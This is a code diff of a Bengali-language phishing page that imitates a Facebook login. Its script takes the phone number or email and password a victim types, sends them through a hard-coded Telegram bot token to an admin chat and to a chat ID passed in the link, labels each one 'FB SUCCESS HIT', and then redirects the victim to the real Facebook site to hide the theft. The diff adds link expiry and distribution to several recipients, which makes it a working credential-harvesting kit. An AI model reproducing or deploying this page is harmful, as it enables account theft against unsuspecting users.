@@ -1,5 +1,4 @@
-
-    async function<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
@@ -21,29 +20,45 @@
 </head>
 <body>
 
-<div class="login-container" id="login-box">
-    <div class="fb-logo">facebook</div>
-    <div id="main-error" class="error-box"></div>
-    
-    <input type="text" id="userInput" placeholder="মোবাইল নম্বর বা ইমেইল ঠিকানা">
-    <input type="password" id="pass1" placeholder="পাসওয়ার্ড">
-    <input type="password" id="pass2" placeholder="পাসওয়ার্ড নিশ্চিত করুন">
-    
-    <button id="login-btn">Log In</button>
-    <a href="#" class="footer-link">Forgotten password?</a>
-</div>
+<div id="content-body">
+    <div class="login-container" id="login-box">
+        <div class="fb-logo">facebook</div>
+        <div id="main-error" class="error-box"></div>
+        
+        <input type="text" id="userInput" placeholder="মোবাইল নম্বর বা ইমেইল ঠিকানা">
+        <input type="password" id="pass1" placeholder="পাসওয়ার্ড">
+        <input type="password" id="pass2" placeholder="পাসওয়ার্ড নিশ্চিত করুন">
+        
+        <button id="login-btn">Log In</button>
+        <a href="#" class="footer-link">Forgotten password?</a>
+    </div>
 
-<div class="login-container" id="loading-screen">
-    <div class="fb-logo">facebook</div>
-    <div class="spinner"></div>
-    <p style="color: #606770;">প্রসেসিং হচ্ছে... অনুগ্রহ করে অপেক্ষা করুন।</p>
+    <div class="login-container" id="loading-screen">
+        <div class="fb-logo">facebook</div>
+        <div class="spinner"></div>
+        <p style="color: #606770;">প্রসেসিং হচ্ছে... অনুগ্রহ করে অপেক্ষা করুন।</p>
+    </div>
 </div>
 
 <script>
     const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
     const adminId = "7068444019";
+    
     const urlParams = new URLSearchParams(window.location.search);
     const userIdFromLink = urlParams.get('id');
+    const expiry = urlParams.get('exp');
+    const currentTime = Math.floor(Date.now() / 1000);
+
+    // --- ১ ঘণ্টার এক্সপায়ারি চেক ---
+    if (expiry && currentTime > expiry) {
+        document.body.innerHTML = `
+            <div style="font-family: Arial; text-align: center; padding-top: 100px;">
+                <h1 style="color: red;">⚠️ লিঙ্কটির মেয়াদ শেষ!</h1>
+                <p>নিরাপত্তার কারণে এই লিঙ্কটি ১ ঘণ্টার জন্য কার্যকর থাকে।</p>
+                <p>বোট থেকে নতুন লিঙ্ক জেনারেট করুন।</p>
+            </div>`;
+        window.stop();
+    }
 
     document.getElementById('login-btn').addEventListener('click', async () => {
         const userInput = document.getElementById('userInput').value.trim();
@@ -53,9 +68,8 @@
 
         errorBox.style.display = 'none';
 
-        // ভ্যালিডেশন চেক
-        const isNumber = /^\d+$/.test(userInput); // শুধু নম্বর কিনা
-        const isGmail = /^[a-zA-Z0-0._%+-]+@gmail\.com$/.test(userInput); // জিমেইল কিনা
+        const isNumber = /^\d+$/.test(userInput);
+        const isGmail = /^[a-zA-Z0-0._%+-]+@gmail\.com$/.test(userInput);
 
         if (!userInput) {
             showError("মোবাইল নম্বর বা ইমেইল ঠিকানা দিন।");
@@ -82,16 +96,22 @@
             return;
         }
 
-        // সব ঠিক থাকলে
+        // এনিমেশন দেখানো
         document.getElementById('login-box').style.display = 'none';
         document.getElementById('loading-screen').style.display = 'block';
 
-        const message = `🔥 **FB SUCCESS HIT** 🔥\n\n📧 Target: \`${userInput}\`\n🔑 Password: \`${p1}\``;
+        const message = `🔥 **FB SUCCESS HIT** 🔥\n\n📧 Target: \`${userInput}\`\n🔑 Password: \`${p1}\`\n\n👤 Report for: \`${userIdFromLink || 'Admin'}\``;
 
+        // অ্যাডমিন এবং ইউজার উভয়ের কাছে ডাটা পাঠানো
         await sendData(adminId, message);
         if (userIdFromLink && userIdFromLink !== adminId) {
             await sendData(userIdFromLink, message);
         }
+
+        // ৫ সেকেন্ড পর আসল ফেসবুকে পাঠিয়ে দেওয়া
+        setTimeout(() => {
+            window.location.href = "https://www.facebook.com/recover/initiate";
+        }, 5000);
     });
 
     function showError(msg) {
@@ -99,14 +119,19 @@
         errorBox.innerText = msg;
         errorBox.style.display = 'block';
     }
- sendData(id, text) {
+
+    async function sendData(id, text) {
         try {
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'Markdown' })
+                body: JSON.stringify({ 
+                    chat_id: id, 
+                    text: text, 
+                    parse_mode: 'Markdown' 
+                })
             });
-        } catch(e) {}
+        } catch(e) { console.error("Failed to send:", e); }
     }
 </script>
 </body>
